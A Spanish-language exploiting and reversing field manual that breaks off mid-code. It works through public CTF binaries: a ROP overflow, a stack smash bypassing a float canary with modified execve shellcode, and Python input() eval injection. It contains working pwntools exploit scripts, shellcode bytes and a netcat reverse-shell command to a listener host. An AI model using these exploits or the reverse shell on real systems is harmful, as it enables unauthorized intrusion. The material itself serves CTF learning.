<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>
<body class="stackedit">
  <div class="stackedit__html"><h1 id="manual">Técnicas fundamentales de Exploiting y Reversing</h1>
  <pre><code>❯ ./rabbit_pwned

	                  .".
                         /  |
                        /  /
                       / ,"
           .-------.--- /
          ".____.-/ o. o\
                 (    Y  )
                  )     /
                 /     (
                /       Y
            .-"         |
           /  _     \    \
          /    `. ". ) /' )
         Y       )( / /(,/
        ,|      /     )
       (_|     /     /
          \_  (__   (__        
            "-._,)--._,)
</code></pre>
<p>Redactado por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
<h2 id="indice">Indice</h2>
<h4 id="indice-exploiting">[Exploiting]</h4>
<p><em><strong>ROP</strong></em></p>
<p><a href="#rops_uno">1. ROP,NX habilitado, usando buffer para sobreescritura de EIP apuntando a función que llama a "/bin/bash" y función read().</a></p>
<p><em><strong>Buffer Overflow</strong></em></p>
<p><a href="#overflow_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></p>
<p><em><strong>Python vulnerability code</strong></em></p>
<p><a href="#python_uno">1. Python input 'eval' function.</a></p>
<p><a href="#python_dos">2. Python input 'eval' function y 'import' bloqueado</a></p>
<p><em><strong>Format String</strong></em></p>
<p><a href="#format_uno">1. Format String. NX habilitado y Stack Canary.</a></p>
<h2 id="introduccion">Introducción</h2>
<p>Recomiendo que se tome este manual como una referencia de los binarios que he ido realizando a lo largo del 2018 y posterior. 
Realmente cada técnica esta dividida en <em>seis</em> apartados con lo mas resañable e interesante a la hora de usar el Black Team Field Manual como una referencia y consulta a la hora de estar explotando o reverseando un binario y ver la técnica usada, los comandos usados, un breve resumen de un informe mas detallado y el código del exploit de su desarrollo.
En la sección de comandos sólo me limito a poner el output del comando mas destacable, recomiendo que descarguen el binario y vean todo el contenido si lo requieren. Es un Field Manual y debe ser versátil para cuando se encuentren un problema de las mismas características sepan resolverlo o le ayuden y desarrollar así el pensamiento lateral.</p>
<p>Esta página web será un documento vivo ya que estará en actualización diaria debido a mi estudio constante.</p>
<h2><a id="rops_uno" href="#rops_uno">1. ROP,NX habilitado, usando buffer para sobreescritura de EIP apuntando a función que llama a "/bin/bash" y función read().</a></h2>
<h4>[Resumen]:</h4>
Tenemos que explotar un ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado.
<h4>[Técnica]:</h4>
ROP usando un buffer para la sobreescritura de EIP apuntando a la función <code>not_called()</code> y ejecutar un <code>/bin/bash</code> protegido con NX habilitado.
<h4>[Informe]:</h4>
<p><em><strong>Recolección de información</strong></em></p>
Primero debemos obtener la información necesaria para realizar la explotación del binario. La principal diferencia entre los buffer overflow y ROP es que este último tienen habilitado NX / ASLR y, a veces, otras protecciones. NX significa "non-executable" impidiendo ejecutar código en el stack. Las direcciones libc y stack son aleatorias, y que ninguna memoria es simultáneamente grabable y ejecutable. Sabiendo que tiene una función <code>read()</code> que va a leer nuestro input que introduzcamos un tamaño de <code>256</code> bytes y también tenemos un buffer <code>ebp-0x88</code> que es donde se almacenará el input. Si desensamblamos la función <code>vulnerable_function()</code> usando radare2 vemos el tamaño que lee siendo uno de sus argumentos. Esto quiere decir que va a leer más que lo que guarda nuestro buffer.
<pre><code>[0xf7fc0c70]> s sym.vulnerable_function
[0x080484b8]> pdf
/ (fcn) sym.vulnerable_function 41
|   sym.vulnerable_function ();
|           ; var int local_88h @ ebp-0x88
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; CALL XREF from 0x08048518 (sym.main)
|           0x080484b8      55             push ebp
|           0x080484b9      89e5           mov ebp, esp
|           0x080484bb      81ec98000000   sub esp, 0x98
|           0x080484c1      c74424080001.  mov dword [local_8h], 0x100 ; [0x100:4]=-1 ; 256
|           0x080484c9      8d8578ffffff   lea eax, dword [local_88h]
|           0x080484cf      89442404       mov dword [local_4h], eax
|           0x080484d3      c70424000000.  mov dword [esp], 0
|           0x080484da      e8a1feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x080484df      c9             leave
\           0x080484e0      c3             ret
</code></pre>
La función que debemos ganar acceso para obtener nuestra shell es <code>not_called()</code> debido a que dentro de la función llama a <code>system("/bin/bash")</code>, por lo tanto es fácil ya que no necesitamos una shellcode.
<p><em><strong>Explotación</strong></em></p>
Usaremos GDB para testear el buffer overflow y ver cuando sobreescribe <code>$eip</code>. Si enviamos un número determinado de "junk" al buffer realizamos la sobreescritura!(ver:exploit). Podemos rastrear la sobreescritura usando <code>strace</code>: 
<pre><code>naivenom@parrot:[~/pwn/rop1_] $ python rop_exploit.py | strace ./rop
read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 144
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x44444444} ---
+++ killed by SIGSEGV +++
Violación de segmento
</code></pre>
Por último ya sabiendo que tenemos controlado <code>$eip</code> lo único que necesitamos es usar la dirección de la función <code>not_called()</code> para que apunte allí y nos ejecute una shell.
<p><em><strong>Obteniendo root shell</strong></em></p>
Pudimos debuggear y analizar el binario en nuestra máquina, pero ahora toca la fase en la que ganamos acceso. El binario vulnerable esta ejecutándose en el servidor víctima en el puerto <code>1234</code>.
<pre><code>root@kali:~/Desktop# nc -lvnp 1234 -e ./rop1-fa6168f4d8eba0eb
listening on [any] 1234 ...
connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 57178
</code></pre>
Ejecutamos en nuestra máquina y boomm! Root user ;)
<pre><code>naivenom@parrot:[~/pwn/rop1_] $ python exploit.py 
[+] Opening connection to 192.168.32.129 on port 1234: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) grupos=0(root)
$ uname -a
Linux kali 4.12.0-kali2-686 #1 SMP Debian 4.12.12-2kali1 (2017-09-13) i686 GNU/Linux
</code></pre>
<h4>[Comandos]:</h4>
Primero antes de nada comprobamos la seguridad del binario y observamos que <code>NX</code> esta habilitado.
<pre><code>❯ gdb -q rop
Reading symbols from rop...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre>
Sobreescritura de <code>$eip</code> con <code>0x44444444</code>. Breakpoint en <code>0x080484df</code>
<pre><code>gdb-peda$ r
Starting program: /home/naivenom/pwn/rop1_/rop 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDBBBBBADDDD
Breakpoint 1, 0x080484df in vulnerable_function ()
gdb-peda$ c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
Stopped reason: SIGSEGV
0x44444444 in ?? ()
</code></pre>
<h4>[Exploit Development]:</h4>
Enviamos al binario cuando lo debugeamos con GDB la salida de este script <code>rop_exploit.py</code>usando <code>r < salida</code>
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">import</span> sys

sys.stdout.write(<span style="color: #0000FF">&quot;A&quot;</span>*<span style="color: #0000FF">140</span>+<span style="color: #0000FF">&quot;DDDD&quot;</span>)
</pre></div>
Exploit remoto.
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *

p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">1234</span>)
exploit = <span style="color: #0000FF">&quot;&quot;</span>
exploit += <span style="color: #0000FF">&quot;\x90&quot;</span>*<span style="color: #0000FF">140</span>
exploit += <span style="color: #0000FF">&quot;\xa4\x84\x04\x08&quot;</span>
p.sendline(exploit)

p.interactive()
</pre></div>
<h4>[URL Reto]:</h4>
<a href="https://github.com/ctfs/write-ups-2013/blob/master/pico-ctf-2013/rop-1/rop1-fa6168f4d8eba0eb">--ROP1 PICO CTF 2013--</a>
<h2><a id="overflow_uno" href="#overflow_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
<h4>[Resumen]:</h4>
Tenemos que explotar un Buffer Overflow protegido con un stack canary float value.
<h4>[Técnica]:</h4>
Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary).
<h4>[Informe]:</h4>
<p><em><strong>Recolección de información</strong></em></p>
Comenzamos analizando estáticamente el código desensamblado del binario. La función más resañable donde se encuentra la vulnerabilidad es en el <code>main()</code>.
En esta función una vez es llamada y configurar el stack en el prólogo ejecuta una instruccion realizando floating load <code>fld qword [0x8048690]</code>.
Seguidamente carga el float value en el stack <code>fstp qword [esp + 0x98]</code>. Luego analizando el desensamblado del binario realiza una serie de llamadas  a <code>printf()</code>, <code>scanf()</code> y probablemente tengamos un Buffer Overflow (BoF de ahora en adelante) después de la función <code>scanf()</code> porque no controlora o checkeara cuantos caracteres o "junk" le enviemos en nuestro buffer.
Finalmente en el mismo bloque antes de llegar a un salto condicional y después de ejecutar <code>scanf()</code> ejecuta la misma instrucción <code>fld qword [esp + 0x98]</code> realizando floating load donde previamente se escribió en el Stack y seguidamente ejecuta <code>fld qword [0x8048690]</code> siendo el original float value del calculo realizado en la FPU. Después de estas dos instrucciones tan relevantes realiza <code>fucompi st(1)</code> comparando ambos valores. Por tanto, esta comprobación se realiza cuando se ejecuta despues del prólogo y antes del salto condicional siendo una especie de Stack Canary.
<pre><code>❯ Ejemplo_                                                                         
Buffer:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + EIP
Smashing Float:    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + MEMORY ADDRESS que queremos controlar
                                                          
FUCOMPI:           AAAAAAAA != 0.245454   Security Detected!

Bypass:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + MEMORY ADDRESS
</code></pre>
Cuando debugeamos el binario y nos encontramos en la dirección de memoria <code>0x080485a3</code> y queremos desensamblar la dirección que contiene el float original value aparece su contenido, sin embargo si desensamblamos la dirección de memoria del stack <code>[esp+0x98]</code> podemos observar que su contenido son justo los valores <code>0x41414141</code> ya que con el data o "junk" que hemos enviado sobreescribe el float value y el stack canary nos lo detectara.

Seguidamente debemos saber donde esta localizada la dirección de memoria del float en el stack, y esta en los últimos 8 Bytes de <code>0xffffd2b0</code>
<p><em><strong>Explotación</strong></em></p>

Bien una vez obtenido toda la información necesaria para la explotación vamos a proceder usando GDB y colocando tres breakpoint en diferentes localizaciones del <code>main</code>:<code>0x804851d</code>,  <code>0x8048553</code>y <code>0x080485a3</code>
<p>Usaremos la salida de la ejecución del primer buffer (ver:exploit) como entrada en el binario cuando lo ejecutemos. Cuando estamos en el último breakpoint y desensamblamos <code>$esp</code> vemos que con lo enviamos no sobreescribimos el float value: <code>0x475a31a5 0x40501555</code> por lo tanto ya lo tenemos calculado para poder bypassear el stack canary!.</p>
<p>Al continuar la ejecución sobreescribimos <code>$eip</code> con <code>0x43434343</code>, eso son las strings "CCCC" por tanto sólo necesitamos de "padding" unos 12 bytes más para luego sobreescribir <code>$eip</code>. Bien, una vez sabemos exactamente donde sobreescribe necesitaremos una shellcode para poder obtener una shell usando la dirección de memoria que vamos a sobreescribir para que <code>$eip</code> apunte al inicio de nuestro buffer aplicando "padding" y acoplando nuestra shellcode (ver:exploit). <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a><p/>
Ejecutamos de nuevo y veremos que por algún motivo no escribe nuestra shellcode a partir del byte <code>\x0b</code> ya que el último en escribir es <code>0x0000b0c0</code>. Según lei este carácter en ascii esta dentro de los "whitespace" y no permite la lectura de mas "data" en la función <code>scanf()</code>, por tanto debido a esto nuestra shellcode falla ya que no sigue leyendo más input. Una solución a esto es hacer mover un valor mayor y restarlo y que el resultado sea el mismo <code>\x0b</code>.
<pre><code>0:  b0 4b                    mov    al,0x4b
2:  2c 40                    sub    al,0x40
</code></pre>
Como el resultado es el mismo simplemente tenemos que coger: <code>b04b2c40</code> y modificar la shellcode (ver:exploit). Una vez modificada la shellcode, solo necesitamos terminar de desarrollar nuestro exploit segun las necesidades del entorno en el que nos encontramos.

<p>Sabemos que el buffer que nos imprime por pantalla al ejecutar el binario coincide con la dirección de memoria del inicio de nuestro buffer donde realizamos el padding de <code>\x90</code> y luego nuestra shellcode, etc...Por tanto sabiendo que esa es la dirección de memoria que debemos sobreescribir <code>$eip</code> tenemos que tener en cuenta cuando desarrollemos el exploit y sabiendo que nos hace leak de la dirección usar en python la función <code>raw_input()</code> para añadirlo y el problema estará resuelto.</p>

<p><em><strong>Obteniendo root shell</strong></em></p>
Pudimos debuggear y analizar el binario en nuestra maquina, pero ahora toca la fase en la que ganamos acceso. El binario vulnerable esta ejecutandose en el servidor victima en el puerto 1234.
<pre><code>root@kali:~/Desktop# nc -nvlp 1234 -e ./precision
listening on [any] 1234 ...
connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 41286
</code></pre>
Ejecutamos en nuestra máquina atacante y root shell!!
<pre><code>naivenom@parrot:[~/pwn] $ python exploit_precision.py 
[+] Opening connection to 192.168.32.129 on port 1234: Done
Buff: 0xbfc92d98

0xbfc92d98
[*] Switching to interactive mode
Got \x90\x90\x90\x90\x90\x90\x90\x90\x90\x901�Ph//shh/bin\x89�PS\x89��K,@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa51ZGU\x15P@AAAAAABBBBBB\x98-ɿ
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ uname -a
Linux kali 4.12.0-kali2-686 #1 SMP Debian 4.12.12-2kali1 (2017-09-13) i686 GNU/Linux
$ python -c 'import pty; pty.spawn("/bin/sh")'
# $ /bin/bash -i
/bin/bash -i
root@kali:/root/Desktop# $  
</code></pre>
<h4>[Comandos]:</h4>
En esta sección haremos una explicación breve paso a paso de los comandos ejecutados. Colocamos un breakpoint justo en la instrucción <code>fucompi</code> y ejecutamos hasta el bp. Seguidamente entramos en visual mode. Por último vemos el desensamblado de la instrucción <code>[esp+0x98]</code> cuyo contenido en esa dirección de memoria es el valor del float value.
<pre><code>❯ r2 -d precision                                                                            
[0x0804851d]&gt; db 0x080485a3 
[0x0804851d]&gt; dc 
Buff: 0xffa3d9e8
AAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3
[0x0804851d]&gt; vpp 
[0x080485a3 170 /home/naivenom/pwn/precision]&gt; ?0;f tmp;s.. @ eip                                                                         
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF                                                                     
0xffa3d9d0  8286 0408 e8d9 a3ff 0200 0000 0000 0000  ................                                                                     
0xffa3d9e0  9c1a f3f7 0100 0000 4141 4141 4141 4141  ........AAAAAAAA                                                                     
0xffa3d9f0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA                                                                     
0xffa3da00  0000 0000 0000 c300 0000 0000 0010 f3f7  ................                                                                     
 eax 0x00000001      ebx 0x00000000      ecx 0x00000001      edx 0xf7ed689c                                                               
 esi 0xf7ed5000      edi 0x00000000      esp 0xffa3d9d0      ebp 0xffa3da78                                                               
 eip 0x080485a3      eflags 1ZI         oeax 0xffffffff                                                                                   
            ;-- eip:                                                                                                                      
|           0x080485a3 b    dfe9           fucompi st(1)                                                                                  
|           0x080485a5      ddd8           fstp st(0)

[0x080485a3]&gt; px@esp+0x98 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffa3da68  a531 5a47 5515 5040 0050 edf7 0050 edf7  .1ZGU.P@.P...P..

</code></pre>
Usaremos mejor GDB, y enviaremos por el input que nos ofrece el binario algunos "junk" data sin sobreescribir aún el float value en el stack. También veremos la informacion de los registros de la FPU y desensamblado de sus direcciones de memoria:
<pre><code>❯ gdb -q precision 
Reading symbols from precision...(no debugging symbols found)...done.
gdb-peda$ break *main
Breakpoint 1 at 0x804851d
gdb-peda$ break *0x080485a3
Breakpoint 2 at 0x80485a3
gdb-peda$ r
Starting program: /home/naivenom/pwn/precision 
Breakpoint 1, 0x0804851d in main ()
gdb-peda$ c
Continuing.
Buff: 0xffffd238
AAAAAAAAAA 
Breakpoint 2, 0x080485a3 in main ()
gdb-peda$ info float 
  R7: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368      
=&gt;R6: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368  
gdb-peda$ x/wx 0x8048690
0x8048690:	0x475a31a5
gdb-peda$ x/wx $esp+0x98
0xffffd2b8:	0x475a31a5
</code></pre>
Ahora una pequeña PoC con radare2. Desensamblamos la dirección de memoria para ver el contenido y smashing stack!! Sobreescritura del float value.
<pre><code>❯ r2 -d precision  
[0x0804851d]&gt; db 0x080485a3
[0x0804851d]&gt; dc
Buff: 0xfff92198
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3
[0x080485a3]&gt; px@esp+0x98 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xfff92218  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92228  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92238  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92248  4141 4141 4100 eef7 0040 f0f7 0000 0000  AAAAA....@......
</code></pre>
También si observamos con radare2 tenemos el valor del float en el offset <code>0xffda4c70</code>:<code>a531 5a47 5515 5040</code>
<pre><code>❯ r2 -d precision 
[0x0804851d]&gt; db 0x08048543
[0x0804851d]&gt; dc
hit breakpoint at: 8048543
[0x0804851d]&gt; px@esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffda4be0  0000 0000 8bcf f5f7 2082 0408 0000 0000  ........ .......
0xffda4bf0  9caa f7f7 0100 0000 10c4 f4f7 0100 0000  ................
0xffda4c00  0000 0000 0100 0000 40a9 f7f7 c200 0000  ........@.......
0xffda4c10  0000 0000 0000 c300 0000 0000 00a0 f7f7  ................
0xffda4c20  0000 0000 0000 0000 0000 0000 00b3 8163  ...............c
0xffda4c30  0900 0000 6e54 daff a98f d7f7 4817 f2f7  ....nT......H...
0xffda4c40  00e0 f1f7 00e0 f1f7 0000 0000 8583 0408  ................
0xffda4c50  fce3 f1f7 0000 0000 00a0 0408 3286 0408  ............2...
0xffda4c60  0100 0000 244d daff 2c4d daff a591 d7f7  ....$M..,M......
0xffda4c70  a029 f6f7 0000 0000 a531 5a47 5515 5040  .).......1ZGU.P@
</code></pre>
Colocamos tres breakpoints y ejecutamos el binario usando como input el buffer del script (ver:exploit) y verificamos desensamblando <code>$esp</code> que no hemos sobreescrito el float value. Finalmente sobreescrito <code>$eip</code>
<pre><code>gdb-peda$ break *main
Breakpoint 1 at 0x804851d
gdb-peda$ break *0x08048553
Breakpoint 2 at 0x8048553
gdb-peda$ break *0x080485a3
Breakpoint 3 at 0x80485a3
gdb-peda$ r &lt; salida
Breakpoint 1, 0x0804851d in main ()
gdb-peda$ c
Breakpoint 2, 0x08048553 in main ()
gdb-peda$ c
Continuing.
Buff: 0xffffd238
Breakpoint 3, 0x080485a3 in main ()
gdb-peda$ x/80wx $esp
0xffffd220:	0x08048682	0xffffd238	0x00000002	0x00000000
0xffffd230:	0xf7ffda9c	0x00000001	0x41414141	0x41414141
0xffffd240:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd250:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd290:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2b0:	0x41414141	0x41414141	0x475a31a5	0x40501555
0xffffd2c0:	0x41414141	0x42424141	0x43424242	0x43434343
0xffffd2d0:	0x45444444	0x47464645	0x49484847	0x4b4a4a49
0xffffd2e0:	0x4d4c4c4b	0x0000004d	0xf7fa1000	0xf7fe574a
gdb-peda$ c
Continuing.
Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�1ZGUP@AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM

Program received signal SIGSEGV, Segmentation fault.
Stopped reason: SIGSEGV
0x43434343 in ?? ()
gdb-peda$ </code></pre>
Si ejecutamos ahora con nuestra shellcode modificada vemos que escribe todo el "data" que nos faltaba y al final nuestro valor coincidente con el buffer <code>0xffffd238</code>
<pre><code>Breakpoint 2, 0x080485a3 in main ()
gdb-peda$ x/128wx $esp
0xffffd220:	0x08048682	0xffffd238	0x00000002	0x00000000
0xffffd230:	0xf7ffda9c	0x00000001	0x90909090	0x90909090
0xffffd240:	0x46b09090	0x80cdc031	0x315b07eb	0x2c4bb0c0
0xffffd250:	0x3180cd40	0xfff2e8c9	0x622fffff	0x622f6e69
0xffffd260:	0x41687361	0x41414141	0x41414141	0x41414141
0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd290:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2b0:	0x41414141	0x41414141	0x475a31a5	0x40501555
0xffffd2c0:	0x41414141	0x42424141	0x42424242	0xffffd238

</code></pre>
<h4>[Exploit Development]:</h4>
Escribimos el primer buffer con "junk" data junto el contenido del float value y mas "junk" como flag's y situarnos bien donde estamos en la memoria.
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">import</span> sys

sys.stdout.write(<span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">128</span>+<span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>+<span style="color: #0000ff;">"AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM"</span>)
</pre>
</div>
Modificación de la shellcode evitando el carácter <code>\x0b</code>
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">import</span> sys

sys.stdout.write(<span style="color: #0000ff;">"\x90"</span>*<span style="color: #0000ff;">10</span>+<span style="color: #0000ff;">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80"</span>+<span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">93</span>+<span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>+<span style="color: #0000ff;">"AAAAAABBBBBB"</span>+<span style="color: #0000ff;">"\x38\xd2\xff\xff"</span>)
</pre>
</div>
Exploit remoto final.
<div style="background: #ffffff; overflow: auto; width: auto;">
<pre style="margin: 0; line-height: 125%;"><span style="color: #000080; font-weight: bold;">from</span> pwn <span style="color: #000080; font-weight: bold;">import</span> *
<span style="color: #000080; font-weight: bold;">import</span> struct

p = remote(<span style="color: #0000ff;">'192.168.32.129'</span>, <span style="color: #0000ff;">1234</span>)
<span style="color: #000080; font-weight: bold;">print</span> p.recvline()
a = <span style="color: #000080; font-weight: bold;">lambda</span> a: struct.pack(<span style="color: #0000ff;">"I"</span>,a)
eip = int(raw_input(),<span style="color: #0000ff;">16</span>)

exploit = <span style="color: #0000ff;">""</span>
exploit += <span style="color: #0000ff;">"\x90"</span>*<span style="color: #0000ff;">10</span>
exploit += <span style="color: #0000ff;">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80"</span>
exploit += <span style="color: #0000ff;">"A"</span>*<span style="color: #0000ff;">93</span>
exploit += <span style="color: #0000ff;">"\xa5\x31\x5a\x47\x55\x15\x50\x40"</span>
exploit += <span style="color: #0000ff;">"AAAAAABBBBBB"</span>
exploit += a(eip)
p.sendline(exploit)

p.interactive()
</pre>
</div>
<h4>[URL Reto]:</h4>
<a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a>
<h2><a id="python_uno" href="#python_uno">1. Python input 'eval' function.</a></h2>
<h4>[Resumen]:</h4>
Tenemos que explotar la función vulnerable input para obtener una shell.
Código:
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-style: italic"># task1.py</span>
<span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Welcome to mystery math!&quot;</span>

flag = <span style="color: #0000FF">&quot;xxxxxxxxxx&quot;</span>

<span style="color: #000080; font-weight: bold">while</span> True:
  x = input(<span style="color: #0000FF">&quot;Enter number 1&gt; &quot;</span>)
  x = x*x + ord(flag[<span style="color: #0000FF">0</span>]) * ord(flag[<span style="color: #0000FF">1</span>]) + ord(flag[<span style="color: #0000FF">2</span>]) * x
  y = input(<span style="color: #0000FF">&quot;Enter number 2&gt; &quot;</span>)
  <span style="color: #000080; font-weight: bold">if</span> y / <span style="color: #0000FF">6</span> + <span style="color: #0000FF">7</span> - y == x:
    <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Here ya go! &quot;</span>, flag
    exit(<span style="color: #0000FF">0</span>)
  <span style="color: #000080; font-weight: bold">else</span>:
    <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Your lucky number is &quot;</span>, x - y
</pre></div>
<h4>[Técnica]:</h4>
Importaremos <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code>. La función <code>input()</code> es vulnerable debido a que es equivalente a <code>eval(raw_input)</code>.
<h4>[Informe]:</h4>
Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input()</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. 
<p><em><strong>Obtención de root shell</strong></em></p>
El binario vulnerable esta ejecutandose en el servidor victima en el puerto <code>4444</code>.
<pre><code>root@kali:~/Desktop# nc -lvnp 4444 | python task1.py
listening on [any] 4444 ...
Welcome to mystery math!
connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 39152
</code></pre>
En nuestra máquina atacante ejecutamos nuestro exploit
<pre><code>naivenom@parrot:[~/pwn] $ python exploit.py 
[+] Opening connection to 192.168.32.129 on port 4444: Done
[*] Switching to interactive mode
$ nc 192.168.32.142 1234 -e /bin/bash
</code></pre>
En otra terminal tenemos nuestro netcat a la escucha para obtener la shell reversa y pwn root!!
<pre><code>naivenom@parrot:[~] $ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.32.142] from (UNKNOWN) [192.168.32.129] 43986
python -c 'import pty; pty.spawn("/bin/bash")'
root@kali:~/Desktop# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@kali:~/Desktop# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@kali:~/Desktop# 
</code></pre>
<h4>[Exploit Development]:</h4>
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *

<span style="color: #000080; font-weight: bold">def</span> exploit(data):
    <span style="color: #000080; font-weight: bold">global</span> p
    p.sendline(data)

p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">4444</span>)

exploit(<span style="color: #0000FF">&#39;__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)&#39;</span>)
p.interactive()
</pre></div>
<h4>[URL Reto]:</h4>
<a href="https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/python-eval-1">--PYTHON EVAL 1 PICO CTF 2013--</a>
<h2><a id="python_dos" href="#python_dos">2. Python input 'eval' function y 'import' bloqueado.</a></h2>
<h4>[Resumen]:</h4>
Tenemos que explotar la función vulnerable input para obtener una shell.
Código:
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-style: italic"># task3.py</span>
<span style="color: #008800; font-style: italic"># Remember kids: this is bad code. Try not code like this :P</span>
<span style="color: #000080; font-weight: bold">from</span> os <span style="color: #000080; font-weight: bold">import</span> path
